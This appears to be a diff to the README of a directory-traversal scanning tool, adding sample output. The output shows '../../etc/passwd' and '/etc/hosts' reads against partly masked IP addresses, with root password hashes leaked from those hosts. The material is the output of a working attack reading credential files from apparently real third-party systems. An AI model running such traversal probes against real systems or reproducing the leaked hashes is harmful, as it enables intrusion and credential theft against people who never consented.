@@ -20,5 +20,20 @@ optional arguments:
 
 ```
 [+] 18x.xxx.xxx.59 /../../../../../../../../../../etc/passwd
-  >>> b'root:absxcfbgXtb3o:0:0:root:/:/bin/sh'
+  >>> root:absxcfbgXtb3o:0:0:root:/:/bin/sh
+```
+
+```
+[+] xx0.xxx.xxx.182 /../../../../../../../../../../etc/passwd
+  >>> root:dBR90FNYY06dg:0:0::/root:/bin/sh
+```
+
+```
+[+] 109.xxx.xxx.xx2 ../../../../../../../../../../../../etc/hosts
+  >>> 127.0.0.1 localhost
+```
+
+```
+[+] 109.xxx.xxx.xx2 ../../../../../../../../../../../../etc/passwd
+  >>> root:$1$wbAnPk8f$yz0PI9vnyLRmWbENUnce3/:0:0::/root:/bin/sh
 ```
